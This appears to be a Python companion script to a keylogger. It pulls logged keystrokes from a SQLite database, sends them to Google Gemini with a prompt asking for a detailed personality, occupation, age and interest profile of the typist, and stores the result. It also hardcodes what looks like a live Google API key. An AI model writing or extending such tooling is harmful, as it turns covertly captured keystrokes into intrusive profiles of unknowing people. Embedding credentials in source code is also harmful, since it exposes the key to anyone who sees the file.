"""
Manual AI Analysis Tool
Run this to analyze logs on-demand without waiting for automatic analysis
"""

import sqlite3
import google.generativeai as genai
from datetime import datetime

# Configuration
GOOGLE_API_KEY = "AIzaSyBc3-hmBU3hzRt-9Ctix2xqt2TzXghYJ1U"
DATABASE_FILE = "keylogger_database.db"

# Configure Google Gemini AI
genai.configure(api_key=GOOGLE_API_KEY)
model = genai.GenerativeModel('gemini-pro')

def get_all_logs(limit=None):
    """Retrieve logs from database"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        if limit:
            cursor.execute('SELECT timestamp, log_data FROM keylogs ORDER BY id DESC LIMIT ?', (limit,))
        else:
            cursor.execute('SELECT timestamp, log_data FROM keylogs ORDER BY id DESC')
        
        logs = cursor.fetchall()
        conn.close()
        return logs
    except Exception as e:
        print(f"Error retrieving logs: {e}")
        return []

def analyze_personality():
    """Perform detailed AI personality analysis"""
    print("="*80)
    print("🤖 MANUAL AI PERSONALITY ANALYSIS")
    print("="*80)
    
    # Get logs
    print("\n📊 Fetching logs from database...")
    logs = get_all_logs(limit=100)
    
    if not logs:
        print("❌ No logs found in database. Run the keylogger first!")
        return
    
    # Combine log data
    combined_text = "\n".join([log[1] for log in logs])
    total_chars = len(combined_text)
    
    print(f"✓ Retrieved {len(logs)} log entries ({total_chars} characters)")
    
    if total_chars < 50:
        print("⚠️ Very limited data. Analysis may not be accurate.")
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Prepare AI prompt
    prompt = f"""
    You are an expert psychologist and behavioral analyst. Analyze the following keyboard activity 
    to create a comprehensive personality profile of the user.
    
    TYPING DATA:
    {combined_text[:4000]}
    
    Please provide a detailed analysis with the following sections:
    
    1. PERSONALITY TYPE
       - Primary classification (Professional, Student, Developer, Writer, Gamer, etc.)
       - Secondary traits
    
    2. KEY CHARACTERISTICS
       - Communication style
       - Technical proficiency level
       - Attention to detail
       - Work habits and patterns
    
    3. BEHAVIORAL INSIGHTS
       - Common vocabulary and phrases
       - Typing patterns (corrections, shortcuts, etc.)
       - Likely profession or field of study
       - Interests and hobbies
    
    4. COGNITIVE PROFILE
       - Problem-solving approach
       - Analytical vs creative thinking
       - Multitasking tendencies
    
    5. ACTIVITY PATTERNS
       - Type of tasks performed
       - Workflow style
       - Time management indicators
    
    6. SUGGESTIONS AND PREDICTIONS
       - Likely age range
       - Probable occupation
       - Skill level in computing
       - Personal interests
       - Recommendations for this type of person
    
    7. CONFIDENCE ASSESSMENT
       - How confident you are in this analysis (percentage)
       - What additional data would improve accuracy
    
    Be specific and detailed in your analysis. Use concrete examples from the typing data.
    """
    
    # Call AI
    print("\n🔄 Analyzing with Google Gemini AI (this may take 10-30 seconds)...")
    print("⏳ Please wait...")
    
    try:
        response = model.generate_content(prompt)
        analysis_result = response.text
        
        # Display results
        print("\n" + "="*80)
        print("🎯 PERSONALITY ANALYSIS RESULTS")
        print("="*80)
        print(analysis_result)
        print("="*80)
        
        # Save to database
        try:
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Simple personality extraction
            personality_type = "Complex Profile"
            if "Professional" in analysis_result or "professional" in analysis_result:
                personality_type = "Professional"
            elif "Student" in analysis_result or "student" in analysis_result:
                personality_type = "Student"
            elif "Developer" in analysis_result or "Programmer" in analysis_result:
                personality_type = "Developer/Programmer"
            elif "Writer" in analysis_result or "writer" in analysis_result:
                personality_type = "Writer"
            elif "Gamer" in analysis_result or "gamer" in analysis_result:
                personality_type = "Gamer"
            
            cursor.execute('''
                INSERT INTO ai_analysis (analysis_time, total_chars, analysis_result, personality_type, confidence_score)
                VALUES (?, ?, ?, ?, ?)
            ''', (timestamp, total_chars, analysis_result, personality_type, 90.0))
            
            conn.commit()
            conn.close()
            
            print(f"\n✅ Analysis saved to database at {timestamp}")
            
        except Exception as e:
            print(f"\n⚠️ Analysis generated but couldn't save to database: {e}")
        
        # Ask to save to file
        save = input("\n💾 Save this analysis to a text file? (y/n): ")
        if save.lower() == 'y':
            filename = f"personality_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("="*80 + "\n")
                f.write("PERSONALITY ANALYSIS REPORT\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Data Analyzed: {total_chars} characters from {len(logs)} log entries\n")
                f.write("="*80 + "\n\n")
                f.write(analysis_result)
            print(f"✅ Saved to {filename}")
        
    except Exception as e:
        print(f"\n❌ Error during AI analysis: {e}")
        print("\nPossible reasons:")
        print("- No internet connection")
        print("- Invalid API key")
        print("- API rate limit exceeded")
        print("- API service temporarily unavailable")

def quick_stats():
    """Show quick database statistics"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM keylogs')
        total_logs = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(char_count) FROM keylogs')
        total_chars = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM ai_analysis')
        total_analyses = cursor.fetchone()[0]
        
        print("\n📊 Quick Stats:")
        print(f"   • Log entries: {total_logs}")
        print(f"   • Total characters: {total_chars:,}")
        print(f"   • Previous analyses: {total_analyses}")
        
        conn.close()
        
    except Exception as e:
        print(f"Error getting stats: {e}")

if __name__ == "__main__":
    print("\n")
    print("╔════════════════════════════════════════════════════════════════╗")
    print("║       🤖 AI PERSONALITY ANALYZER - MANUAL MODE                ║")
    print("╚════════════════════════════════════════════════════════════════╝")
    
    quick_stats()
    
    print("\n" + "-"*80)
    proceed = input("\n▶️  Start AI analysis now? (y/n): ")
    
    if proceed.lower() == 'y':
        analyze_personality()
    else:
        print("Analysis cancelled.")
    
    print("\n✓ Done!\n")
